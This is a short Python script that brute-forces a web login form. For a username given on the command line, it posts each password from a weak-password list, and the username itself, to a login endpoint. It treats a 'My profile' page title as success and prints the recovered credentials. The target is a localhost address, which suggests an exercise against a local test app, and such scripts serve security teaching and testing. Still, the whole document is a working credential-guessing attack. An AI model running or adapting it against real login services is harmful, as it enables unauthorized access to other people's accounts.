import sys
import requests
import bs4 as bs


def isloggedin(response):
    soup = bs.BeautifulSoup(response.text, 'html.parser')
    return soup.title.text == "My profile"


def main(argv):
    url = "http://127.0.0.1:5000/login"
    username = sys.argv[1]
    passwords = [p.strip() for p in open("weakpasswords.txt")]

    for password in passwords + [username]:
        print(password)
        response = requests.post(url, data={"username": username, "password": password})
        
        if isloggedin(response):
            print()
            print("Username:", username)
            print("Password:", password)
            print("Login successful")
            break


if __name__ == "__main__":
    main(sys.argv)